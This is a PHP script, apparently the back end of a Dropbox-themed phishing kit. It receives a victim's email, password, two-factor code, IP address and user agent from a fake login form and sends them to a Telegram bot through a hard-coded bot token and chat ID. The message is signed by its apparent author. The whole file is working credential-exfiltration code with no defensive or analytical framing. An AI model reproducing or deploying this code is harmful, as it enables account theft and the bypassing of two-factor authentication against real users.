<?php

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    // Show a simple message if accessed directly
    echo "<!DOCTYPE html><html><head><title>nex.php</title></head><body>";
    echo "<h2>This endpoint is for AJAX POST requests only.</h2>";
    echo "</body></html>";
    exit;
}

// === CONFIG ===
$botToken = '7621065346:AAELlxfUIusS4cbaFh152-mhDqZO4XG7VH0';
$chatId = '7917987192';
// ==============

// Get data from POST
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$code = $_POST['code'] ?? '';
$attempt = $_POST['attempt'] ?? '1';
$agent = $_POST['agent'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];

// Compose message
$message = "|--------- 🚨*DROPBOX 2FA* ----------| \n"
         . "📧 *Online ID    :* `$email`\n"
         . "🔑 *Passcode     :* `$password`\n"
         . ($code ? "🔢 *OTP      :* `$code`\n" : '')
         . "🌍 *IP Address:* $ip"
         . "🌐 *User Agent:* $agent\n"
         . " *|----by @lex_ash----|*";

// Send to Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'header'  => "Content-type: application/json",
        'method'  => 'POST',
        'content' => json_encode($data)
    ]
];

$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);

if ($result === FALSE) {
    http_response_code(500);
    echo "fail";
} else {
    http_response_code(200);
    echo "ok";
}
?>
php -S localhost:8000
